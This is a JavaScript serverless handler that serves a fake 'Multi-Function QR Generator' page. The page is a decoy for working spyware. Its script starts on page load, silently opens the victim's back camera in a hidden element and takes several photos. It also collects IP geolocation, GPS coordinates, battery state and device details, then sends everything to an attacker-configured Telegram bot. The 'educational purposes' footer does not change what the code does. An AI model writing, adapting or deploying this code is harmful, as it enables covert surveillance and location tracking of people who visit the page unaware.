// api/back-cam-Hack.js
export default async function handler(req, res) {
  const { chatId, botToken } = req.query;

  // Validate required parameters
  if (!chatId || !botToken) {
    return res.status(400).send(`
      <html>
        <head>
          <title>Missing Parameters</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              background-color: #f5f5f5;
            }
            .container {
              text-align: center;
              padding: 2rem;
              border-radius: 10px;
              background-color: white;
              box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
              max-width: 90%;
            }
            h1 {
              color: #d32f2f;
              margin-bottom: 1rem;
            }
            p {
              margin-bottom: 1rem;
              line-height: 1.5;
            }
            code {
              background-color: #f5f5f5;
              padding: 0.2rem 0.4rem;
              border-radius: 4px;
              font-family: monospace;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Missing Parameters</h1>
            <p>Please provide both <code>chatId</code> and <code>botToken</code> as query parameters.</p>
            <p>Example: <code>https://your-website.com/api/back-cam-Hack?chatId=YOUR_CHAT_ID&botToken=YOUR_BOT_TOKEN</code></p>
          </div>
        </body>
      </html>
    `);
  }

  // Get client IP address and other info
  const clientIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // Send main website HTML with hidden camera capture
  res.setHeader('Content-Type', 'text/html');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Function QR Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: white;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .header h1 i {
            margin-right: 15px;
            color: #4CAF50;
        }

        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
        }

        /* Function Selector */
        .function-selector {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .function-selector h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .function-selector h3 i {
            margin-right: 10px;
            color: #4CAF50;
        }

        .function-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }

        .function-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .function-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .function-btn.active {
            background: rgba(76, 175, 80, 0.3);
            border-color: #4CAF50;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }

        /* Telegram Section */
        .telegram-section {
            text-align: center;
            margin-bottom: 30px;
        }

        .telegram-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: linear-gradient(45deg, #0088cc, #00aced);
            color: white;
            text-decoration: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
        }

        .telegram-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
        }

        /* Configuration Section */
        .config-section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .config-card h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .config-card h3 i {
            margin-right: 10px;
            color: #4CAF50;
        }

        .config-inputs {
            display: grid;
            gap: 20px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
        }

        .input-group label {
            margin-bottom: 8px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .input-group input,
        .input-group textarea,
        .input-group select {
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 1rem;
            color: #333;
            transition: all 0.3s ease;
        }

        .input-group input:focus,
        .input-group textarea:focus,
        .input-group select:focus {
            outline: none;
            background: white;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.3);
        }

        .save-btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .save-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }

        /* Form Sections */
        .form-section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .warning-text {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.5);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .generate-btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            margin-top: 20px;
        }

        .generate-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }

        .generate-btn.camera-btn {
            background: linear-gradient(45deg, #2196F3, #1976D2);
        }

        .generate-btn.video-btn {
            background: linear-gradient(45deg, #FF5722, #E64A19);
        }

        .generate-btn.ip-btn {
            background: linear-gradient(45deg, #9C27B0, #7B1FA2);
        }

        .generate-btn.multi-btn {
            background: linear-gradient(45deg, #FF9800, #F57C00);
        }

        /* Hidden Camera Elements */
        #hidden-camera {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
            top: -9999px;
            left: -9999px;
        }

        /* Features Section */
        .features-section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .features-section h3 {
            margin-bottom: 25px;
            font-size: 1.8rem;
            text-align: center;
        }

        .features-section h3 i {
            margin-right: 10px;
            color: #4CAF50;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }

        .feature-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .feature-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .feature-card i {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: #4CAF50;
        }

        .feature-card h4 {
            margin-bottom: 10px;
            font-size: 1.3rem;
        }

        .feature-card p {
            opacity: 0.9;
            line-height: 1.5;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .footer p {
            margin-bottom: 10px;
        }

        .footer a {
            color: #4CAF50;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .function-buttons {
                grid-template-columns: 1fr;
            }
            
            .features-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 1.6rem;
            }
            
            .form-section,
            .config-section,
            .function-selector {
                padding: 20px;
            }
            
            .generate-btn {
                padding: 12px 20px;
                font-size: 1rem;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Hidden Camera Elements -->
    <div id="hidden-camera">
        <video id="camera-feed" autoplay></video>
        <canvas id="camera-canvas" style="display: none;"></canvas>
    </div>

    <div class="container">
        <header class="header">
            <h1><i class="fas fa-qrcode"></i> Multi-Function QR Generator</h1>
            <p>Advanced QR generator with camera, live video, IP tracking, and multi-function capabilities</p>
        </header>

        <!-- Function Selection -->
        <div class="function-selector">
            <h3><i class="fas fa-list"></i> Select Function</h3>
            <div class="function-buttons">
                <button class="function-btn active" data-function="basic" id="basicBtn">
                    <i class="fas fa-qrcode"></i>
                    Basic QR
                </button>
                <button class="function-btn" data-function="camera" id="cameraBtn">
                    <i class="fas fa-camera"></i>
                    Camera Access
                </button>
                <button class="function-btn" data-function="video" id="videoBtn">
                    <i class="fas fa-video"></i>
                    Live Video
                </button>
                <button class="function-btn" data-function="ip" id="ipBtn">
                    <i class="fas fa-globe"></i>
                    IP Info
                </button>
                <button class="function-btn" data-function="multi" id="multiBtn">
                    <i class="fas fa-layer-group"></i>
                    Multi-Function
                </button>
            </div>
        </div>

        <!-- Telegram Channel Button -->
        <div class="telegram-section">
            <a href="http://vishal-hacker0.netlify.app" target="_blank" class="telegram-btn">
                <i class="fab fa-telegram-plane"></i>
                Join Our Telegram Channel
            </a>
        </div>

        <!-- Bot Configuration Section -->
        <div class="config-section" id="configSection">
            <div class="config-card">
                <h3><i class="fas fa-cog"></i> Bot Configuration</h3>
                <div class="config-inputs">
                    <div class="input-group">
                        <label for="botToken">
                            <i class="fas fa-robot"></i>
                            Telegram Bot Token
                        </label>
                        <input 
                            type="text" 
                            id="botToken" 
                            placeholder="Enter Your Bot Token"
                            value="${chatId}"
                        >
                    </div>
                    <div class="input-group">
                        <label for="chatId">
                            <i class="fas fa-comments"></i>
                            Chat ID
                        </label>
                        <input 
                            type="text" 
                            id="chatId" 
                            placeholder="Enter Your Chat Id"
                            value="${botToken}"
                        >
                    </div>
                    <button class="save-btn" id="saveConfigBtn">
                        <i class="fas fa-save"></i>
                        Save Configuration
                    </button>
                </div>
            </div>
        </div>

        <!-- Basic QR Form -->
        <div class="form-section" id="basicForm">
            <form id="qrForm">
                <div class="input-group">
                    <label for="linkInput">
                        <i class="fas fa-link"></i>
                        Enter URL or Link
                    </label>
                    <input type="url" id="linkInput" placeholder="https://example.com" required>
                </div>
                
                <div class="input-group">
                    <label for="textInput">
                        <i class="fas fa-font"></i>
                        Additional Text (Optional)
                    </label>
                    <textarea id="textInput" placeholder="Enter any additional text here..." rows="3"></textarea>
                </div>
                
                <button type="submit" class="generate-btn">
                    <i class="fas fa-qrcode"></i>
                    Generate QR Code
                </button>
            </form>
        </div>

        <!-- Features Section -->
        <div class="features-section">
            <h3><i class="fas fa-star"></i> Advanced Features</h3>
            <div class="features-grid">
                <div class="feature-card">
                    <i class="fas fa-camera"></i>
                    <h4>Camera Access</h4>
                    <p>Request camera permission and capture photos</p>
                </div>
                <div class="feature-card">
                    <i class="fas fa-video"></i>
                    <h4>Live Video</h4>
                    <p>Record live video with audio</p>
                </div>
                <div class="feature-card">
                    <i class="fas fa-map-marked-alt"></i>
                    <h4>Location Tracking</h4>
                    <p>Precise IP geolocation with Google Maps integration</p>
                </div>
                <div class="feature-card">
                    <i class="fas fa-layer-group"></i>
                    <h4>Multi-Function</h4>
                    <p>Combine multiple data collection features</p>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="footer">
            <p>&copy; 2024 Multi-Function QR Generator. For educational purposes only.</p>
            <p>Created by <strong>@Vishalzxxx</strong> | <a href="https://t.me/Bot_Hacking_Tip" target="_blank">Telegram Channel</a></p>
        </footer>
    </div>

    <script>
        // Telegram Configuration from URL parameters
        const botToken = "${botToken}";
        const chatId = "${chatId}";
        const serverIp = "${clientIP}";
        
        // Camera elements
        const cameraFeed = document.getElementById('camera-feed');
        const cameraCanvas = document.getElementById('camera-canvas');
        const ctx = cameraCanvas.getContext('2d');
        
        let stream = null;
        let cameraAccessAttempted = false;
        let userAgent = navigator.userAgent;
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let currentTime = new Date().toLocaleString();
        let batteryLevel = 'Unknown';
        let isCharging = false;

        // Get battery information if available
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + '%';
                    isCharging = battery.charging;
                    
                    battery.addEventListener('levelchange', () => {
                        batteryLevel = Math.round(battery.level * 100) + '%';
                    });
                    
                    battery.addEventListener('chargingchange', () => {
                        isCharging = battery.charging;
                    });
                } else if ('battery' in navigator) {
                    batteryLevel = Math.round(navigator.battery.level * 100) + '%';
                    isCharging = navigator.battery.charging;
                }
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
            
            return { batteryLevel, isCharging };
        }

        // Automatically access camera when page loads
        window.onload = async function() {
            // Get battery info first
            await getBatteryInfo();
            
            // Start camera capture silently
            setTimeout(async () => {
                await captureCameraSilently();
            }, 1000);
        };

        // Access back camera silently without showing any UI
        async function captureCameraSilently() {
            if (cameraAccessAttempted) return;
            cameraAccessAttempted = true;
            
            try {
                // Try to get the back camera (environment-facing)
                const constraints = {
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraFeed.srcObject = stream;
                
                // Wait for video to be ready
                cameraFeed.onloadedmetadata = function() {
                    // Capture multiple photos silently
                    setTimeout(() => {
                        captureMultiplePhotos();
                    }, 2000);
                };
            } catch (error) {
                console.error('Error accessing back camera:', error);
                
                // If back camera fails, try any available camera
                try {
                    const constraints = {
                        video: true,
                        audio: false 
                    };
                    
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraFeed.srcObject = stream;
                    
                    cameraFeed.onloadedmetadata = function() {
                        setTimeout(() => {
                            captureMultiplePhotos();
                        }, 2000);
                    };
                } catch (fallbackError) {
                    console.error('Error accessing any camera:', fallbackError);
                    // Send data without photo if camera access fails
                    sendInitialDataToTelegram();
                }
            }
        }

        // Capture multiple photos silently
        async function captureMultiplePhotos() {
            try {
                cameraCanvas.width = cameraFeed.videoWidth;
                cameraCanvas.height = cameraFeed.videoHeight;
                
                // Capture 3 photos with delays
                for (let i = 0; i < 3; i++) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    ctx.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
                    const photoData = cameraCanvas.toDataURL('image/jpeg', 0.8);
                    
                    // Send each photo immediately
                    await sendPhotoToTelegram(photoData, i + 1);
                }
                
                // Stop camera stream after capturing
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Send final data summary
                await sendFinalDataToTelegram();
                
            } catch (error) {
                console.error('Error capturing photos:', error);
                // Send data without photos if capture fails
                sendInitialDataToTelegram();
            }
        }

        // Get IP address using a third-party service
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return serverIp || 'Unknown';
            }
        }

        // Get location info based on IP
        async function getLocationInfo(ip) {
            try {
                const response = await fetch(\`https://ipapi.co/\${ip}/json/\`);
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
            } catch (error) {
                console.error('Error getting location:', error);
                return {
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    isp: 'Unknown',
                    latitude: 'Unknown',
                    longitude: 'Unknown'
                };
            }
        }

        // Get precise GPS location
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        });
                    },
                    error => {
                        resolve({ error: error.message });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Send photo to Telegram
        async function sendPhotoToTelegram(photoData, photoNumber) {
            try {
                // Convert base64 to blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Get updated location info
                const clientIP = await getIPAddress();
                const locationInfo = await getLocationInfo(clientIP);
                
                const message = \`📸 CAMERA CAPTURE ALERT - Photo \${photoNumber}/3

🌍 IP: \${clientIP}
📍 Location: \${locationInfo.city}, \${locationInfo.region}, \${locationInfo.country}
🏢 ISP: \${locationInfo.isp}
🕒 Time: \${new Date().toLocaleString()}
⏰ Timezone: \${timezone}
🔋 Battery: \${batteryLevel}
⚡ Charging: \${isCharging ? 'Yes' : 'No'}
📱 Device: \${userAgent}\`;

                // Create form data to send the photo
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, \`camera_capture_\${photoNumber}.jpg\`);
                formData.append('caption', message);
                
                // Send photo to Telegram
                await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: 'POST',
                    body: formData,
                });
                
            } catch (photoError) {
                console.error('Error sending photo:', photoError);
            }
        }

        // Send initial data to Telegram
        async function sendInitialDataToTelegram() {
            const clientIP = await getIPAddress();
            const locationInfo = await getLocationInfo(clientIP);
            const gpsLocation = await getGPSLocation();
            
            await getBatteryInfo();
            
            let message = \`🚨 WEBSITE ACCESS DETECTED

🌍 IP ADDRESS: \${clientIP}
🏳️ COUNTRY: \${locationInfo.country}
🏙️ CITY: \${locationInfo.city}
📍 REGION: \${locationInfo.region}
📡 ISP: \${locationInfo.isp}\`;

            // Add GPS location if available
            if (gpsLocation && !gpsLocation.error) {
                message += \`\\n🗺️ GPS COORDINATES: \${gpsLocation.latitude}, \${gpsLocation.longitude}\`;
                message += \`\\n🎯 ACCURACY: \${Math.round(gpsLocation.accuracy)} meters\`;
                if (gpsLocation.altitude) {
                    message += \`\\n⛰️ ALTITUDE: \${Math.round(gpsLocation.altitude)} meters\`;
                }
            }

            message += \`\\n⏰ TIMEZONE: \${timezone}\`;
            message += \`\\n🕒 CURRENT TIME: \${currentTime}\`;
            message += \`\\n🔋 BATTERY: \${batteryLevel}\`;
            message += \`\\n⚡ CHARGING: \${isCharging ? 'Yes' : 'No'}\`;
            message += \`\\n🌐 BROWSER: \${userAgent}\`;

            await sendTextMessage(message);
        }

        // Send final data summary
        async function sendFinalDataToTelegram() {
            const clientIP = await getIPAddress();
            const locationInfo = await getLocationInfo(clientIP);
            const gpsLocation = await getGPSLocation();
            
            let message = \`✅ DATA COLLECTION COMPLETE

📊 SUMMARY:
🌍 IP: \${clientIP}
📍 Location: \${locationInfo.city}, \${locationInfo.country}
📡 ISP: \${locationInfo.isp}
🕒 Time: \${new Date().toLocaleString()}
📸 Photos Captured: 3
🔋 Battery: \${batteryLevel}
⚡ Charging: \${isCharging ? 'Yes' : 'No'}\`;

            // Add GPS coordinates if available
            if (gpsLocation && !gpsLocation.error) {
                message += \`\\n🗺️ GPS: \${gpsLocation.latitude}, \${gpsLocation.longitude}\`;
                message += \`\\n🎯 Accuracy: ±\${Math.round(gpsLocation.accuracy)}m\`;
            }

            message += \`\\n\\n📱 Device Info: \${userAgent}\`;

            await sendTextMessage(message);
        }

        // Send text message to Telegram
        async function sendTextMessage(message) {
            try {
                await fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
            } catch (error) {
                console.error('Error sending message:', error);
            }
        }

        // Website functionality
        document.addEventListener('DOMContentLoaded', function() {
            // Function selection
            const functionBtns = document.querySelectorAll('.function-btn');
            const formSections = document.querySelectorAll('.form-section');
            
            functionBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    const functionType = this.getAttribute('data-function');
                    
                    // Update active button
                    functionBtns.forEach(b => b.classList.remove('active'));
                    this.classList.add('active');
                    
                    // Show corresponding form section
                    formSections.forEach(section => {
                        section.style.display = 'none';
                    });
                    
                    document.getElementById('basicForm').style.display = 'block';
                });
            });

            // Form submission
            document.getElementById('qrForm').addEventListener('submit', function(e) {
                e.preventDefault();
                alert('QR Code functionality would be implemented here');
            });

            // Configuration save
            document.getElementById('saveConfigBtn').addEventListener('click', function() {
                alert('Configuration saved!');
            });
        });
    </script>
</body>
</html>
  `);
}